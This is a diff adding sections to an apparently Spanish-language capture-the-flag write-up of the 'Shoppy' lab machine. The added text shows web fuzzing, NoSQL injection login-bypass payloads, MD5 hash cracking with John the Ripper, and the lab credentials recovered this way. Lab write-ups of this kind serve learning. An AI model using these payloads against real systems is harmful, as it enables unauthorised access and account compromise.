@@ -10,6 +10,13 @@ nmap -sC -p 22,80,9093 IP
 
 Esto re direcciona a shoppy.htb lo cual nos da indicios de que podria utilizar vhosting
 
+# Fuzzing
+
+```
+wfuzz -c --hc=404,301 -t 200 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://shoppy.htb/FUZZ 
+```
+
+
 # Vhost Discovery
 
 Virtual hosting es la capacidad de tener varios subdominos ( *.example.com ) en un mismo servidor 
@@ -43,9 +50,40 @@ gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt 
 
 Encontramos un logging
 
+# No SQL Inyection
+
+De alguna u otra manera ( la cual no entiendo aun) nos dimos cuenta que es una base de datos No SQL MongoDB intentamos unos payloads sencillos.
+
+```
+admin'||'1==1
+admin'||'1=1
+```
+
+Y cualquiera de esos jala. Entramos
 
 
+# Hash
 
+Ya dentro pues si estas con el usuario admin lo mas logico es que buscaras ese no¿?
+
+```
+EL password del usuario admin
+hash-identifier
+john --format=raw-md5 -w $(locate rockyou.txt)  hashes
+
+admin
+emerald 
+
+```
+
+Pero que crees si vuelves a probar una inyeccion te manda no solo el hash de admin si no un usuario josh
+
+```
+josh 
+
+remembermethisway
+
+```
 
 
 
